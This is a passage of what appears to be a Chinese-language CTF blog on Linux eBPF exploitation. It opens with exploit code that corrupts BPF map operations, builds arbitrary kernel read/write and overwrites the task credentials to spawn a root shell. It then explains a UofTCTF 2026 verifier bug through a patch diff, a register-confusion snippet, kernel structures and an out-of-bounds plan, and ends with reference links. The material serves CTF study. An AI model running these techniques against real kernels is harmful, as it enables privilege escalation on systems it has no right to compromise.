        BPF_MOV64_IMM(BPF_REG_0, kbase + ARRAY_MAP_UPDATE_ELEM_OFFSET),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0x60),

        BPF_MOV64_IMM(BPF_REG_0, kbase + ARRAY_MAP_LOOKUP_ELEM_OFFSET),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0x58),

        BPF_MOV64_IMM(BPF_REG_0, kbase + 0x20e9c0), // array_of_map_gen_lookup
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 19 * 8),

        BPF_MOV64_IMM(BPF_REG_0, kbase + 0x20eff0), // array_map_free
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 3 * 8),

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, arb_read_write_map_fd),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // get values ptr

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        // trigger vuln
        BPF_MOV64_IMM(BPF_REG_0, 0x110),
        BPF_MOV64_IMM(BPF_REG_1, 64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_0),

        BPF_LD_IMM64(BPF_REG_0, map_ptr_values),

        // overwrite map_ops with oob_map_ptr
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),

        BPF_EXIT_INSN(),
    };

    run_bpf_prog(overwrite_ops, sizeof(overwrite_ops)/sizeof(overwrite_ops[0]));

    struct bpf_insn arb_read_write[] = {
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_10, 0, -4),

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, arb_read_write_map_fd),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // will use array_of_map_gen_lookup

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),

        BPF_LD_ABS(BPF_B, 0),
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0), // decide bit for arb_read or arb_write

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, info_map_fd),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_9, 1, 4),

        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), // arb_read
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_7, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0), // arb_write
        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    setup_bpf_prog(arb_read_write, sizeof(arb_read_write)/sizeof(arb_read_write[0]));

    uint64_t current_task_struct = arb_read(arb_read(__per_cpu_offset) + current_task);
    uint64_t init_cred = kbase + INIT_CRED_OFFSET;

    arb_write(current_task_struct + CRED_OFFSET, init_cred);

    system("/bin/sh");
}
```











#### D^3CTF 2022__d3bpf-v2









#### UofTCTF 2026  - [extended-eBPF](https://github.com/UofTCTF/uoftctf-2026-chals-public/blob/main/eebpf)

账号输入ctf即可登录，再`cd /`

内核版本：6.12.47





禁掉`ALU Sanitation`，



在`adjust_scalar_min_max_vals`中：

```
	if (!is_safe_to_compute_dst_reg_range(insn, &src_reg)) {
		__mark_reg_unknown(env, dst_reg);
		return 0;
	}
```



```diff
diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
index 24ae8f33e5d7..e5641845ecc0 100644
--- a/kernel/bpf/verifier.c
+++ b/kernel/bpf/verifier.c
@@ -13030,7 +13030,7 @@ static int retrieve_ptr_limit(const struct bpf_reg_state *ptr_reg,
 static bool can_skip_alu_sanitation(const struct bpf_verifier_env *env,
 				    const struct bpf_insn *insn)
 {
-	return env->bypass_spec_v1 || BPF_SRC(insn->code) == BPF_K;
+	return true;
 }
 
 static int update_alu_sanitation_state(struct bpf_insn_aux_data *aux,
@@ -14108,7 +14108,7 @@ static bool is_safe_to_compute_dst_reg_range(struct bpf_insn *insn,
 	case BPF_LSH:
 	case BPF_RSH:
 	case BPF_ARSH:
-		return (src_is_const && src_reg->umax_value < insn_bitness);
+		return (src_reg->umax_value < insn_bitness);
 	default:
 		return false;
 	}

```



**构造verifier和runtime不一致的寄存器**

```c
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
        BPF_LDX_MEM(BPF_W, BPF_REG_8, BPF_REG_7, 0),
        BPF_ALU64_IMM(BPF_AND, BPF_REG_8, 1),
        BPF_MOV64_IMM(BPF_REG_0, 1),
        BPF_ALU64_REG(BPF_ARSH, BPF_REG_0, BPF_REG_8), // the bug verifier thinks REG_0 is 1 while is 0
        BPF_MOV64_IMM(BPF_REG_9, 1),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_0), // verifier thinks REG_9 is 0 while is 1
```

这里把一个`map`的值设置为1，然后`look_up_elem`。接下来，进入上面的代码。

把`runtime`为1的值读入reg8，`and`运算后`verifier`认为它是[0,1]

接着进行`1 arsh reg8`，由于`arsh`运算取的是`umin_val`，所以`verifier`认为它是1，实际上它是0









不管是对`ALU32`还是`ALU64`，进行`arsh`运算的时候，都是去`src_reg`的`umin`进行操作

```c
static void scalar32_min_max_arsh(struct bpf_reg_state *dst_reg,
				  struct bpf_reg_state *src_reg)
{
	u64 umin_val = src_reg->u32_min_value;

	/* Upon reaching here, src_known is true and
	 * umax_val is equal to umin_val.
	 */
	dst_reg->s32_min_value = (u32)(((s32)dst_reg->s32_min_value) >> umin_val);
	dst_reg->s32_max_value = (u32)(((s32)dst_reg->s32_max_value) >> umin_val);

	dst_reg->var_off = tnum_arshift(tnum_subreg(dst_reg->var_off), umin_val, 32);

	/* blow away the dst_reg umin_value/umax_value and rely on
	 * dst_reg var_off to refine the result.
	 */
	dst_reg->u32_min_value = 0;
	dst_reg->u32_max_value = U32_MAX;

	__mark_reg64_unbounded(dst_reg);
	__update_reg32_bounds(dst_reg);
}
static void scalar_min_max_arsh(struct bpf_reg_state *dst_reg,
				struct bpf_reg_state *src_reg)
{
	u64 umin_val = src_reg->umin_value;

	/* Upon reaching here, src_known is true and umax_val is equal
	 * to umin_val.
	 */
	dst_reg->smin_value >>= umin_val;
	dst_reg->smax_value >>= umin_val;

	dst_reg->var_off = tnum_arshift(dst_reg->var_off, umin_val, 64);

	/* blow away the dst_reg umin_value/umax_value and rely on
	 * dst_reg var_off to refine the result.
	 */
	dst_reg->umin_value = 0;
	dst_reg->umax_value = U64_MAX;

	/* Its not easy to operate on alu32 bounds here because it depends
	 * on bits being shifted in from upper 32-bits. Take easy way out
	 * and mark unbounded so we can recalculate later from tnum.
	 */
	__mark_reg32_unbounded(dst_reg);
	__update_reg_bounds(dst_reg);
}
```





##### 源码

```c
struct bpf_map {
	const struct bpf_map_ops *ops;
	struct bpf_map *inner_map_meta;
#ifdef CONFIG_SECURITY
	void *security;
#endif
	enum bpf_map_type map_type;
	u32 key_size;
	u32 value_size;
	u32 max_entries;
	u64 map_extra; /* any per-map-type extra fields */
	u32 map_flags;
	u32 id;
	struct btf_record *record;
	int numa_node;
	u32 btf_key_type_id;
	u32 btf_value_type_id;
	u32 btf_vmlinux_value_type_id;
	struct btf *btf;
#ifdef CONFIG_MEMCG
	struct obj_cgroup *objcg;
#endif
	char name[BPF_OBJ_NAME_LEN];
	struct mutex freeze_mutex;
	atomic64_t refcnt;
	atomic64_t usercnt;
	/* rcu is used before freeing and work is only used during freeing */
	union {
		struct work_struct work;
		struct rcu_head rcu;
	};
	atomic64_t writecnt;
	/* 'Ownership' of program-containing map is claimed by the first program
	 * that is going to use this map or by the first program which FD is
	 * stored in the map to make sure that all callers and callees have the
	 * same prog type, JITed flag and xdp_has_frags flag.
	 */
	struct {
		const struct btf_type *attach_func_proto;
		spinlock_t lock;
		enum bpf_prog_type type;
		bool jited;
		bool xdp_has_frags;
	} owner;
	bool bypass_spec_v1;
	bool frozen; /* write-once; write-protected by freeze_mutex */
	bool free_after_mult_rcu_gp;
	bool free_after_rcu_gp;
	atomic64_t sleepable_refcnt;
	s64 __percpu *elem_count;
};
```



```c
struct bpf_array {
	struct bpf_map map;
	u32 elem_size;
	u32 index_mask;
	struct bpf_array_aux *aux;
	union {
		DECLARE_FLEX_ARRAY(char, value) __aligned(8);
		DECLARE_FLEX_ARRAY(void *, ptrs) __aligned(8);
		DECLARE_FLEX_ARRAY(void __percpu *, pptrs) __aligned(8);
	};
};
```





##### 利用思路

由于三个`map`在内存上是连在一起的，每个`map`加上`0x400`就是下一个`map`

利用`verifier`和运行时不一致的寄存器，越界读写下一个`map`（`victim map`）的`max_entries`和`index_mask`，都设置为`0xffffffff`，这样就能越界读写这个`map`接下来的很大一部分内存

> 修改`index_map`是因为，某些路径中有：
>
> ```c
> index &= array->index_mask;
> ```
>
> 









#### DownUnderCTF 2025_Rolling Around

https://9anux.org/2025/07/24/ebpf/













#### 阿里云CTF 2025 beebee

https://blog.xmcve.com/2025/02/25/%E9%98%BF%E9%87%8C%E4%BA%91CTF2025-Writeup/#title-6

https://bbs.kanxue.com/thread-285786-1.htm

https://xz.aliyun.com/news/17029?amp;u_atoken=27649aed9882a7bda204f993c159b1a6&amp;u_asig=54d85











## ref

[BPF之路一bpf系统调用](https://www.anquanke.com/post/id/263803)，主要涉及`ebpf`的`JIT`部分

[SECCON2021-kone_gadget WP](https://niebelungen-d.github.io/seccon2021-kone-gadget/)

[Linux内核eBPF虚拟机源码分析——verifier与jit ](https://bbs.kanxue.com/thread-267956-1.htm)

[Jailbreaking eBPF](https://9anux.org/2025/07/24/ebpf/)

[Linux内核PWN [BPF模块整数溢出] 漏洞分析](https://bbs.kanxue.com/thread-266200.htm)

[a3 ](https://arttnba3.cn/tags/eBPF/)

[Linux内核eBPF虚拟机源码分析——verifier与jit](https://bbs.kanxue.com/thread-267956-1.htm)

[ebpf docs](https://docs.ebpf.io/)

https://github.com/iovisor/bpf-docs/blob/master/eBPF.md

https://stdnoerr.blog/blog/eBPF-exploitation-D3CTF-d3bpf

https://196082.github.io/2023/01/06/d3bpf/
